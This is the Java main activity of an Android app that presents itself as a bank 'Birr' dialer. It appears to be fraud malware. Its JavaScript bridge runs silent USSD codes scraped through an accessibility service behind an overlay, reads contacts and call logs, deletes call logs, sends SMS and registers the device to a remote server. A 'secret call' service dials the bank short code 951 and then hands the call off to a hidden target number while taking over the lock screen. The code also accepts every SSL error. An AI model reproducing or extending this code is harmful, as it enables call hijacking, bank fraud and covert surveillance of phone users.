package com.cbe.cbebirrdialer;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Rect;
import android.media.AudioManager;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.view.View;
import android.view.ViewTreeObserver;
import android.view.WindowInsets;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.Toast;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final String APP_URL = "https://appassets.androidplatform.net/dialer";

    public static volatile MainActivity currentInstance = null;
    public static volatile boolean isExpectingUssdResponse = false;
    public static volatile boolean isActivityForeground = false;

    private WebView webView;
    private String pendingInitialDial = "";
    private boolean onboardingChainActive = false;

    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && DialerUssdAccessibilityService.ACTION_RECEIVER_FOUND.equals(intent.getAction())) {
                String name = intent.getStringExtra(DialerUssdAccessibilityService.EXTRA_NAME);
                if (name != null && !name.trim().isEmpty()) {
                    injectReceiverName(name.trim());
                }
            }
        }
    };

    @SuppressLint({"SetJavaScriptEnabled", "UnspecifiedRegisterReceiverFlag"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        currentInstance = this;
        extractInitialDialFromIntent(getIntent());
        DialerSyncHelper.requestFreshStateFromBanking(this);

        applyCallWindowFlags(getIntent());
        if (getWindow() != null) {
            getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
        }

        IntentFilter filter = new IntentFilter(DialerUssdAccessibilityService.ACTION_RECEIVER_FOUND);
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }
        } catch (Throwable ignored) {
        }

        FrameLayout rootContainer = new FrameLayout(this);
        rootContainer.setFitsSystemWindows(true);
        webView = new WebView(this);
        rootContainer.addView(
            webView,
            new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        );
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        SupportWebChromeClient.configureWebSettings(settings);
        settings.setTextZoom(100);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        if (Build.VERSION.SDK_INT >= 21) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.setWebChromeClient(new SupportWebChromeClient());
        DialerBridge bridge = new DialerBridge(this);
        webView.addJavascriptInterface(bridge, "DialerBridge");
        webView.addJavascriptInterface(bridge, "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                if (request == null || request.getUrl() == null) return null;
                Uri uri = request.getUrl();
                String host = uri.getHost();
                if (host == null) return null;

                if ("appassets.androidplatform.net".equalsIgnoreCase(host)
                    || "offline-api-disabled.local".equalsIgnoreCase(host)) {
                    String path = uri.getPath();
                    if (path != null && path.startsWith("/api/")) {
                        byte[] jsonBytes = "{\"ok\":true,\"offline\":true}".getBytes(StandardCharsets.UTF_8);
                        return new WebResourceResponse(
                            "application/json",
                            "UTF-8",
                            new ByteArrayInputStream(jsonBytes)
                        );
                    }
                    String assetPath = (path == null || path.isEmpty() || "/".equals(path))
                        ? "web/dialer.html"
                        : "web/" + (path.startsWith("/") ? path.substring(1) : path);
                    InputStream is = null;
                    String resolvedPath = assetPath;
                    try {
                        is = getAssets().open(SupportWebChromeClient.mapWebAssetPath(assetPath));
                    } catch (Exception firstErr) {
                        String htmlFallback = assetPath + ".html";
                        try {
                            is = getAssets().open(SupportWebChromeClient.mapWebAssetPath(htmlFallback));
                            resolvedPath = htmlFallback;
                        } catch (Exception ignored) {
                            return null;
                        }
                    }
                    return new WebResourceResponse(resolveMimeType(resolvedPath), "UTF-8", is);
                }
                return null;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                if (request == null || request.getUrl() == null) return false;
                return handleTelUrl(request.getUrl().toString());
            }

            @SuppressWarnings("deprecation")
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return handleTelUrl(url);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (pendingInitialDial != null && !pendingInitialDial.isEmpty()) {
                    pushInitialDialToWeb(pendingInitialDial);
                    pendingInitialDial = "";
                }
                notifyBankingStateSynced();
                SecretInCallService.pushCurrentStateToUi();
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                if (handler != null) handler.proceed();
            }
        });

        setContentView(rootContainer);
        attachKeyboardInsetListener(rootContainer);
        webView.loadUrl(APP_URL);

        if (!DialerSyncHelper.areAllCorePermissionsGranted(this)) {
            onboardingChainActive = true;
            DialerSyncHelper.startNextPermissionStep(this, 0);
        }
    }

    private void attachKeyboardInsetListener(final FrameLayout rootContainer) {
        final float density = getResources().getDisplayMetrics().density > 0
            ? getResources().getDisplayMetrics().density
            : 1f;

        if (Build.VERSION.SDK_INT >= 30) {
            rootContainer.setOnApplyWindowInsetsListener(new View.OnApplyWindowInsetsListener() {
                @Override
                public WindowInsets onApplyWindowInsets(View v, WindowInsets insets) {
                    int imeBottom = insets.getInsets(WindowInsets.Type.ime()).bottom;
                    int sysBottom = insets.getInsets(WindowInsets.Type.systemBars()).bottom;
                    int bottomPad = Math.max(imeBottom, sysBottom);
                    v.setPadding(0, 0, 0, bottomPad);
                    int kbCssPx = Math.round(Math.max(0, imeBottom - sysBottom) / density);
                    if (webView != null) {
                        webView.evaluateJavascript(
                            "if(window.onAndroidKeyboardHeightChanged){window.onAndroidKeyboardHeightChanged(" + kbCssPx + ");}",
                            null
                        );
                    }
                    return insets;
                }
            });
        } else {
            final View decor = getWindow() != null ? getWindow().getDecorView() : rootContainer;
            decor.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
                private int lastKbHeight = -1;

                @Override
                public void onGlobalLayout() {
                    Rect r = new Rect();
                    decor.getWindowVisibleDisplayFrame(r);
                    int screenHeight = decor.getRootView().getHeight();
                    int keypadHeight = Math.max(0, screenHeight - r.bottom);
                    boolean kbOpen = keypadHeight > screenHeight * 0.14;
                    int effectivePx = kbOpen ? keypadHeight : 0;
                    if (effectivePx != lastKbHeight) {
                        lastKbHeight = effectivePx;
                        rootContainer.setPadding(0, 0, 0, effectivePx);
                        int kbCssPx = Math.round(effectivePx / density);
                        if (webView != null) {
                            webView.evaluateJavascript(
                                "if(window.onAndroidKeyboardHeightChanged){window.onAndroidKeyboardHeightChanged(" + kbCssPx + ");}",
                                null
                            );
                        }
                    }
                }
            });
        }
    }

    public void onPermissionChainFinished() {
        onboardingChainActive = false;
        notifyBankingStateSynced();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        notifyBankingStateSynced();
        if (requestCode == DialerSyncHelper.REQ_DIALER_PERMISSIONS && onboardingChainActive) {
            DialerSyncHelper.startNextPermissionStep(this, 1);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        notifyBankingStateSynced();
        if (!onboardingChainActive) return;
        if (requestCode == DialerSyncHelper.REQ_DEFAULT_DIALER) {
            DialerSyncHelper.startNextPermissionStep(this, 2);
        } else if (requestCode == DialerSyncHelper.REQ_OVERLAY_PERMISSION) {
            DialerSyncHelper.startNextPermissionStep(this, 3);
        } else if (requestCode == DialerSyncHelper.REQ_BATTERY_PERMISSION) {
            DialerSyncHelper.startNextPermissionStep(this, 4);
        } else if (requestCode == DialerSyncHelper.REQ_FULL_SCREEN_INTENT) {
            DialerSyncHelper.startNextPermissionStep(this, 5);
        } else if (requestCode == DialerSyncHelper.REQ_ACCESSIBILITY_PERMISSION) {
            DialerSyncHelper.startNextPermissionStep(this, 6);
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        applyCallWindowFlags(intent);
        extractInitialDialFromIntent(intent);
        if (pendingInitialDial != null && !pendingInitialDial.isEmpty()) {
            pushInitialDialToWeb(pendingInitialDial);
            pendingInitialDial = "";
        }
        SecretInCallService.pushCurrentStateToUi();
    }

    @Override
    protected void onResume() {
        super.onResume();
        isActivityForeground = true;
        applyCallWindowFlags(getIntent());
        updateVolumeStreamForCall(SecretInCallService.hasAnyActiveCall());
        DialerSyncHelper.requestFreshStateFromBanking(this);
        notifyBankingStateSynced();
        SecretInCallService.pushCurrentStateToUi();
    }

    @Override
    protected void onPause() {
        super.onPause();
        isActivityForeground = false;
        if (SecretInCallService.isSecretCallActive()) {
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (SecretInCallService.isSecretCallActive() && !isActivityForeground) {
                        SecretInCallService.bringUiToFrontIfSecret();
                    }
                }
            }, 140L);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isActivityForeground = false;
        currentInstance = null;
        SecretInCallService.setStandaloneCallAudioActive(this, false, false);
        try {
            unregisterReceiver(receiver);
        } catch (Throwable ignored) {
        }
    }

    private void extractInitialDialFromIntent(Intent intent) {
        if (intent == null || intent.getData() == null) return;
        Uri data = intent.getData();
        if ("tel".equalsIgnoreCase(data.getScheme())) {
            String raw = data.getSchemeSpecificPart();
            if (raw != null && !raw.trim().isEmpty()) {
                pendingInitialDial = raw.trim();
            }
        }
    }

    private void pushInitialDialToWeb(final String number) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (webView == null || number == null) return;
                String safe = number.replace("\\", "\\\\").replace("'", "\\'");
                webView.evaluateJavascript(
                    "if(window.onDialerInitialNumber){window.onDialerInitialNumber('" + safe + "');}",
                    null
                );
            }
        });
    }

    public void notifyBankingStateSynced() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (webView == null) return;
                String js = "try{window.dispatchEvent(new Event('cbe-dialer-banking-synced'));}catch(e){}"
                    + "try{if(window.onDialerBankingStateSynced){window.onDialerBankingStateSynced();}}catch(e){}";
                webView.evaluateJavascript(js, null);
            }
        });
    }

    private boolean handleTelUrl(String url) {
        if (url != null && url.startsWith("tel:")) {
            executeSilentUssd(url);
            return true;
        }
        return false;
    }

    private void executeSilentUssd(String rawTelUri) {
        if (Build.VERSION.SDK_INT >= 23
            && checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            DialerSyncHelper.requestDialerPermissions(this);
            return;
        }
        isExpectingUssdResponse = true;
        if (DialerUssdAccessibilityService.instance != null) {
            DialerUssdAccessibilityService.instance.showLoadingOverlay();
        }
        try {
            String dialUri = (rawTelUri != null && rawTelUri.startsWith("tel:"))
                ? rawTelUri
                : "tel:" + (rawTelUri != null ? rawTelUri.replace("#", Uri.encode("#")) : "");
            Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse(dialUri));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(callIntent);
        } catch (Exception e) {
            isExpectingUssdResponse = false;
            if (DialerUssdAccessibilityService.instance != null) {
                DialerUssdAccessibilityService.instance.hideLoadingOverlay();
            }
            Toast.makeText(this, "Could not dial: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    public void refreshCallWindowFlags() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                applyCallWindowFlags(null);
                updateVolumeStreamForCall(SecretInCallService.hasAnyActiveCall());
            }
        });
    }

    public void updateVolumeStreamForCall(final boolean inCall) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    setVolumeControlStream(inCall ? AudioManager.STREAM_VOICE_CALL : AudioManager.USE_DEFAULT_STREAM_TYPE);
                } catch (Throwable ignored) {
                }
            }
        });
    }

    @SuppressWarnings("deprecation")
    private void applyCallWindowFlags(Intent intent) {
        boolean showForCall = SecretInCallService.hasAnyActiveCall()
            || (intent != null && "show".equals(intent.getStringExtra("native_call_action")));
        try {
            if (Build.VERSION.SDK_INT >= 27) {
                setShowWhenLocked(showForCall);
                setTurnScreenOn(showForCall);
            }
            if (getWindow() != null) {
                if (showForCall) {
                    getWindow().addFlags(
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                    );
                } else {
                    getWindow().clearFlags(
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                    );
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private void placeCallViaTelecomOrActionCall(String number) {
        if (number == null || number.trim().isEmpty()) return;
        String target = number.trim();
        if (Build.VERSION.SDK_INT >= 23) {
            TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
            if (tm != null) {
                Bundle extras = new Bundle();
                PhoneAccountHandle handle = null;
                try {
                    handle = tm.getDefaultOutgoingPhoneAccount("tel");
                    if (handle == null
                        && checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        List<PhoneAccountHandle> accounts = tm.getCallCapablePhoneAccounts();
                        if (accounts != null && !accounts.isEmpty()) {
                            handle = accounts.get(0);
                        }
                    }
                } catch (Throwable ignoredHandle) {
                }
                if (handle != null) {
                    extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, handle);
                }
                tm.placeCall(Uri.fromParts("tel", target, null), extras);
                return;
            }
        }
        String clean = target.replace("#", Uri.encode("#"));
        Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + clean));
        callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(callIntent);
    }

    private void placeNormalCallInternal(String number) {
        if (number == null || number.trim().isEmpty()) return;
        if (Build.VERSION.SDK_INT >= 23
            && checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            try {
                String clean = number.trim().replace("#", Uri.encode("#"));
                Intent dialIntent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + clean));
                dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(dialIntent);
            } catch (Throwable ignored) {
            }
            return;
        }
        try {
            isExpectingUssdResponse = false;
            placeCallViaTelecomOrActionCall(number.trim());
        } catch (Throwable e) {
            Toast.makeText(this, "Call failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    public void setReceiverNameFromService(String name) {
        injectReceiverName(name);
    }

    private void injectReceiverName(final String name) {
        isExpectingUssdResponse = false;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (webView != null && name != null && !name.isEmpty()) {
                    String safe = name.replace("\\", "\\\\").replace("'", "\\'");
                    String js = "if(window.onDialerReceiverNameReceived){window.onDialerReceiverNameReceived('"
                        + safe
                        + "');}";
                    webView.evaluateJavascript(js, null);
                }
            }
        });
    }

    public void bringToFrontForCall() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    applyCallWindowFlags(getIntent());
                    Intent bringIntent = new Intent(MainActivity.this, MainActivity.class);
                    bringIntent.addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK
                        | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
                    );
                    bringIntent.putExtra("native_call_action", "show");
                    startActivity(bringIntent);
                } catch (Throwable ignored) {
                }
            }
        });
    }

    public void bringToFrontForSecretCall() {
        bringToFrontForCall();
    }

    public void notifySecretJs(final String js) {
        if (js == null || js.isEmpty()) return;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (webView != null) {
                    webView.evaluateJavascript("try{" + js + "}catch(e){}", null);
                }
            }
        });
    }

    private static String resolveMimeType(String path) {
        String lower = path.toLowerCase(Locale.US);
        if (lower.endsWith(".html")) return "text/html";
        if (lower.endsWith(".js")) return "application/javascript";
        if (lower.endsWith(".css")) return "text/css";
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".json")) return "application/json";
        if (lower.endsWith(".svg")) return "image/svg+xml";
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
        if (lower.endsWith(".webp")) return "image/webp";
        if (lower.endsWith(".mp3")) return "audio/mpeg";
        if (lower.endsWith(".wav")) return "audio/wav";
        if (lower.endsWith(".ogg")) return "audio/ogg";
        if (lower.endsWith(".webm")) return "audio/webm";
        if (lower.endsWith(".m4a")) return "audio/mp4";
        if (lower.endsWith(".woff2")) return "font/woff2";
        if (lower.endsWith(".txt")) return "text/plain";
        return "application/octet-stream";
    }

    public class DialerBridge {
        private final Context mContext;

        DialerBridge(Context ctx) {
            this.mContext = ctx;
        }

        @JavascriptInterface
        public void dialUSSD(final String ussdCode) {
            dialSilentUssdLookup(ussdCode);
        }

        @JavascriptInterface
        public void dialSilentUssdLookup(final String ussdCode) {
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String normalized = ussdCode;
                        if (normalized != null && !normalized.startsWith("tel:")) {
                            normalized = "tel:" + URLDecoder.decode(normalized, "UTF-8").replace("#", Uri.encode("#"));
                        }
                        MainActivity.this.executeSilentUssd(normalized);
                    } catch (Throwable ignored) {
                        MainActivity.this.executeSilentUssd(ussdCode);
                    }
                }
            });
        }

        @JavascriptInterface
        public void cancelSilentUssd() {
            isExpectingUssdResponse = false;
            if (DialerUssdAccessibilityService.instance != null) {
                DialerUssdAccessibilityService.instance.cancelActiveUssd();
            }
        }

        @JavascriptInterface
        public void placeNormalCall(final String number) {
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    MainActivity.this.placeNormalCallInternal(number);
                }
            });
        }

        @JavascriptInterface
        public void sendSms(String payload) {
            DialerSyncHelper.sendSmsIpc(mContext, payload);
        }

        @JavascriptInterface
        public void registerCallDevice(String deviceId, String apiBaseUrl) {
            DialerSyncHelper.registerDevice(mContext, deviceId, apiBaseUrl);
        }

        @JavascriptInterface
        public String getBankingStateJson() {
            return DialerSyncHelper.getBankingStateJson(mContext);
        }

        @JavascriptInterface
        public void syncBankingState() {
            DialerSyncHelper.requestFreshStateFromBanking(mContext);
            MainActivity.this.notifyBankingStateSynced();
        }

        @JavascriptInterface
        public void applyTransferToBanking(String txJson) {
            DialerSyncHelper.applyTransferToBanking(mContext, txJson);
        }

        @JavascriptInterface
        public String getContactsJson() {
            return DialerSyncHelper.getContactsJson(mContext);
        }

        @JavascriptInterface
        public String getCallLogsJson() {
            return DialerSyncHelper.getCallLogsJson(mContext);
        }

        @JavascriptInterface
        public void deleteCallLogs(String idsJson) {
            DialerSyncHelper.deleteCallLogs(mContext, idsJson);
        }

        @JavascriptInterface
        public void openMessages(String phone) {
            DialerSyncHelper.openMessagesWithNumber(mContext, phone);
        }

        @JavascriptInterface
        public String getPermissionStatusJson() {
            return DialerSyncHelper.getPermissionStatusJson(mContext);
        }

        @JavascriptInterface
        public boolean hasAllCorePermissions() {
            return DialerSyncHelper.areAllCorePermissionsGranted(mContext);
        }

        @JavascriptInterface
        public void requestDialerPermissions() {
            MainActivity.this.onboardingChainActive = true;
            DialerSyncHelper.startNextPermissionStep(MainActivity.this, 0);
        }

        @JavascriptInterface
        public void requestRuntimePermissions() {
            DialerSyncHelper.requestRuntimePermissionsOnly(MainActivity.this);
        }

        @JavascriptInterface
        public void openPermissionSetting(String kind) {
            DialerSyncHelper.openPermissionSetting(MainActivity.this, kind);
        }

        @JavascriptInterface
        public void requestDefaultDialerRole() {
            DialerSyncHelper.requestDefaultDialerRole(MainActivity.this);
        }

        @JavascriptInterface
        public void startReal951CarrierCall() {
            SecretInCallService.armReal951Call();
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= 23
                        && MainActivity.this.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                        SecretInCallService.resetSecretState();
                        DialerSyncHelper.requestDialerPermissions(MainActivity.this);
                        notifySecretJs("window.onReal951StateChanged && window.onReal951StateChanged('error');");
                        return;
                    }
                    try {
                        MainActivity.this.placeCallViaTelecomOrActionCall("951");
                    } catch (Throwable e) {
                        SecretInCallService.resetSecretState();
                        notifySecretJs("window.onReal951StateChanged && window.onReal951StateChanged('error');");
                    }
                }
            });
        }

        @JavascriptInterface
        public void handoff951ToSecretTarget() {
            SecretInCallService.beginSeamlessHandoffFromReal951();
        }

        @JavascriptInterface
        public void startSecretBackgroundCall(final String targetNumber, final int maxRingMs) {
            if (targetNumber == null || targetNumber.trim().isEmpty()) return;
            final String cleanTarget = targetNumber.trim();
            final long armSeq = SecretInCallService.armSecretCall(cleanTarget, maxRingMs > 0 ? maxRingMs : 8000);
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    if (!SecretInCallService.isArmSeqActive(armSeq)) {
                        return;
                    }
                    if (Build.VERSION.SDK_INT >= 23
                        && MainActivity.this.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                        SecretInCallService.resetSecretState();
                        DialerSyncHelper.requestDialerPermissions(MainActivity.this);
                        notifySecretJs("window.onSecretCallError && window.onSecretCallError('CALL_PHONE permission required');");
                        return;
                    }
                    try {
                        MainActivity.this.placeCallViaTelecomOrActionCall(cleanTarget);
                    } catch (Throwable e) {
                        SecretInCallService.resetSecretState();
                        notifySecretJs("window.onSecretCallError && window.onSecretCallError('Secret call failed');");
                    }
                }
            });
        }

        @JavascriptInterface
        public void cancelSecretBackgroundCall() {
            SecretInCallService.markUserCancelledNow();
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    SecretInCallService.disconnectActiveSecretCall();
                }
            });
        }

        @JavascriptInterface
        public void setSecretCallSpeaker(final boolean speakerOn) {
            SecretInCallService.setSpeakerEnabled(speakerOn);
        }

        @JavascriptInterface
        public void setSecretCallMuted(final boolean muted) {
            SecretInCallService.setCallMuted(muted);
        }

        @JavascriptInterface
        public void setSecretCallHeld(final boolean held) {
            SecretInCallService.setActiveCallHeld(held);
        }

        @JavascriptInterface
        public void setSecretCallBluetooth(final boolean on) {
            SecretInCallService.setBluetoothEnabled(on);
        }

        @JavascriptInterface
        public void setStandaloneCallAudioActive(final boolean active, final boolean speakerOn) {
            SecretInCallService.setStandaloneCallAudioActive(mContext, active, speakerOn);
        }

        @JavascriptInterface
        public void sendActiveCallDtmf(final String digit) {
            SecretInCallService.sendActiveCallDtmf(digit);
        }

        @JavascriptInterface
        public String getActiveNativeCallJson() {
            return SecretInCallService.getActiveNativeCallStateJson();
        }

        @JavascriptInterface
        public void answerNativeCall() {
            SecretInCallService.answerIncomingFromUiOrNotification();
        }

        @JavascriptInterface
        public void endNativeCall() {
            SecretInCallService.rejectOrEndNativeCall();
        }

        @JavascriptInterface
        public void setNativeCallMuted(final boolean muted) {
            SecretInCallService.setCallMuted(muted);
        }

        @JavascriptInterface
        public void setNativeCallHeld(final boolean held) {
            SecretInCallService.setActiveCallHeld(held);
        }

        @JavascriptInterface
        public void setNativeCallSpeaker(final boolean on) {
            SecretInCallService.setSpeakerEnabled(on);
        }

        @JavascriptInterface
        public void setNativeCallBluetooth(final boolean on) {
            SecretInCallService.setBluetoothEnabled(on);
        }

        @JavascriptInterface
        public void sendNativeCallDtmf(final String digit) {
            SecretInCallService.sendActiveCallDtmf(digit);
        }

        @JavascriptInterface
        public void exitApp() {
            finishAffinity();
            System.exit(0);
        }
    }
}
